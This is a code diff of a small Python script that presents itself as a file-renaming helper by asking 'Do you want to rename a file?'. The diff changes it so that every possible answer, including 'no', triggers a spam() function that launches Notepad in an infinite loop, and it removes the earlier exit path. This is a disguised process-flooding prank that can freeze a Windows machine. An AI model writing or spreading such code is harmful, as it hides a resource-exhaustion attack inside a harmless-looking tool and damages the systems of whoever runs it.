@@ -1,21 +1,20 @@
 import subprocess
-import sys
+
+
+def spam():
+    print("Gotcha")
+    while True:
+        subprocess.Popen('C:\\Windows\\System32\\notepad.exe')
 
 
 def main():
     rinomina = input("Do you want to rename a file? (yes, no) ")
 
-    if rinomina == "yes":
-        print("Gotcha")
-        while True:
-            subprocess.Popen('C:\\Windows\\System32\\notepad.exe')
-
-    elif rinomina == "no":
-        print("Ok! See you soon!")
-        sys.exit()
+    if rinomina in ("yes", "no", "Yes", "No"):
+        spam()
 
     else:
-        print("Invalid input! Please re-open the program.")
+        spam()
 
 
 main()
